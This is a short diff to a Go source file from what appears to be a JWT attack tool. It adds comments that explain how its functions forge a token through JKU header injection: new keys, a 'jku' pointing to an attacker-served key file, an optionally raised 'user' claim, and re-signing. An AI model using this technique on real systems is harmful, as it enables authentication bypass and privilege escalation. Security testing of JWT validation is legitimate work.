@@ -19,6 +19,20 @@ func launchServer(port int) {
 	http.ListenAndServe(":"+strconv.Itoa(port), nil)
 }
 
+//Create a token to exploit the JKU Header Injection Attack
+
+// The process is the following :
+// - Create a copy of the token,
+// - Generate new public/private keys
+// - Write the public key into a new file
+// - Change the value of "jku" to make it point to our file
+// - If possible : Change the "user" payload to elevate our privileges
+// - Sign the token with the private key
+
+// Token is a valid JWT
+// url is the URL that is used to reach the user's server that will contain the file
+
+// Return the newly created token, or an error
 func generateJkuToken(token *jwt.Token, url string) (string, error) {
 
 	tokenCpy := ctrl.CloneToken(token)
@@ -68,6 +82,7 @@ func generateJkuToken(token *jwt.Token, url string) (string, error) {
 	return newJWT, nil
 }
 
+// Execute the JKU Header Injection Attack, and launch the server that will serve the file
 func ExploitJKU(token *jwt.Token, url string, server bool) (string, error) {
 
 	newJWT, err := generateJkuToken(token, url)
@@ -82,5 +97,4 @@ func ExploitJKU(token *jwt.Token, url string, server bool) (string, error) {
 	}
 
 	return newJWT, nil
-
 }
